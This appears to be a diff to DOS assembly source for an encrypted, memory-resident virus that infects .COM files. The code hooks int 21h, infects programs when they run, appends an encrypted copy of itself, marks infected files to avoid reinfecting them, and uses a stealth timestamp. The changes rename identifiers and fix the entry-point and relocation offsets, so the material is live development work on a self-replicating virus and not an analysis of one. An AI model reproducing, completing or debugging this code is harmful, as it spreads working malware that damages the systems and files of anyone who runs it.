@@ -25,26 +25,15 @@ VirusSize	equ	EndVirus-BeginVirus
 SegmentSize	equ	(EndVirus-BeginVirus+1023)/1024
 TimeStamp	equ	10001b				; Stealth marker
 VirusInterrupt	equ	7979h
-VirusIdentifier	equ	'bA'
+VirusHandshake	equ	'JG'
+ComMarker	equ	'@'
 
 ;---------------------------------------------------------------------
 ;	The virus begins here
 ;---------------------------------------------------------------------
 
 BeginVirus:
-	push	ax
-	pop	ax
-	push	ax
-	pop	ax
-
-	call	@@delta
-@@delta:
-	pop	bp					; bp holds current location
-	sub	bp, offset @@delta			; calculate delta offset
-	lea	si, [bp+offset @@quit]
-	mov	word ptr ds:[si], 20cdh
-@@quit:	mov	word ptr ds:[si], 04c7h
-	call	EncryptDecrypt
+	jmp	EntryPoint
 
 ;---------------------------------------------------------------------
 ;	Start of encrypted section
@@ -53,7 +42,7 @@ BeginVirus:
 BeginEncryptedSection:
 	mov	ax, VirusInterrupt			; Check if in mem
 	int	21h
-	cmp	ax, VirusIdentifier
+	cmp	ax, VirusHandshake
 	je	AlreadyResident
 
 	mov	ax, es					; Get PSP
@@ -62,14 +51,16 @@ BeginEncryptedSection:
 
 	sub	word ptr ds:[3], SegmentSize*64		; Change...
 	sub	word ptr ds:[12h], SegmentSize*64	; ...allocation
-	mov	es, word ptr ds:[12h]			; Calc usable segment
+	mov	ax, word ptr ds:[12h]			; Calc usable segment
+	sub	ax, 10h					; Compensate org 100h
+	mov	es, ax
 
 	push	cs
 	pop	ds
 
 	lea	si, [bp+offset BeginVirus]		; Source
-	xor	di, di					; Destination
-	mov	cx, VirusSize/2+1			; Bytes to copy
+	mov	di, 100h				; Destination
+	mov	cx, (VirusSize+1)/2			; Bytes to copy
 	rep	movsw					; Move it!
 
 	xor	ax, ax
@@ -88,7 +79,7 @@ AlreadyResident:
 	pop	es
 	pop	ds
 
-	lea	si, [bp+OrgJmp]
+	lea	si, [bp+OldJmp]
 	mov	di, 100h
 	push	di					; Save di at 100h
 	movsw						; Copy first bytes
@@ -102,7 +93,7 @@ AlreadyResident:
 Int21hHandler:
 	cmp	ax, VirusInterrupt			; Return installation
 	jne	@@next
-	mov	ax, VirusIdentifier
+	mov	ax, VirusHandshake
 	iret
 @@next:	cmp	ax, 4b00h				; Execute?
 	je	InfectFileOnExecute
@@ -133,15 +124,15 @@ InfectFileOnExecute:
 
 	mov	ah, 3fh					; Read first bytes
 	mov	cx, 4
-	mov	dx, offset OrgJmp
+	mov	dx, offset OldJmp
 	int	21h
 
-	cmp	word ptr OrgJmp, 'ZM'			; Check if .EXE file
+	cmp	word ptr OldJmp, 'ZM'			; Check if .EXE file
 	je	@@skip					; Don't infect!
-	cmp	word ptr OrgJmp, 'MZ'
+	cmp	word ptr OldJmp, 'MZ'
 	je	@@skip
 
-	cmp	byte ptr OrgJmp+3, '@'			; Don't reinfect!
+	cmp	byte ptr OldJmp+3, ComMarker		; Don't reinfect!
 	je	@@skip
 
 	mov	ax, 4202h				; Go to EOF
@@ -154,7 +145,7 @@ InfectFileOnExecute:
 	cmp	ax, VirusSize				; or too small files
 	jb	@@skip
 
-	add	ax, offset BeginVirus-3			; Calc entry offset
+	add	ax, offset EntryPoint-103h		; Calc entry offset
 	mov	word ptr NewJmp[1], ax			; Move it to NewJmp
 
 @@loop:	mov	ah, 2ch					; Get encrypt value
@@ -165,7 +156,7 @@ InfectFileOnExecute:
 
 	mov	ax, 08d00h				; Copy virus to mem
 	mov	es, ax
-	xor	di, di
+	mov	di, 100h
 	mov	si, di
 	mov	cx, (VirusSize+1)/2
 	rep	movsw
@@ -176,7 +167,7 @@ InfectFileOnExecute:
 
 	mov	ah, 40h					; Write virus to file
 	mov	cx, VirusSize
-	cwd
+	mov	dx, offset BeginVirus
 	int	21h
 
 	push	cs					; cs=ds
@@ -206,8 +197,8 @@ InfectFileOnExecute:
 
 	jmp	OldInt21h
 
-NewJmp	db	0e9h, 00h, 00h, '@'			; New entry buffer
-OrgJmp	db	0cdh, 20h, 00h, 00h			; 4 byte buffer
+NewJmp	db	0e9h, 00h, 00h, ComMarker		; New entry buffer
+OldJmp	db	0cdh, 20h, 00h, 00h			; 4 byte buffer
 
 Time	dw	0
 Date	dw	0
@@ -227,6 +218,19 @@ Key	dw	0					; en/decrypt value
 	inc	si
 	loop	@@loop
 	ret
+
+EntryPoint:
+	push	ax
+	pop	ax
+	push	ax
+	pop	ax
+
+	call	@@delta
+@@delta:
+	pop	bp					; bp holds current location
+	sub	bp, offset @@delta			; calculate delta offset
+	call	EncryptDecrypt
+	jmp	BeginEncryptedSection
 
 EndVirus:
 
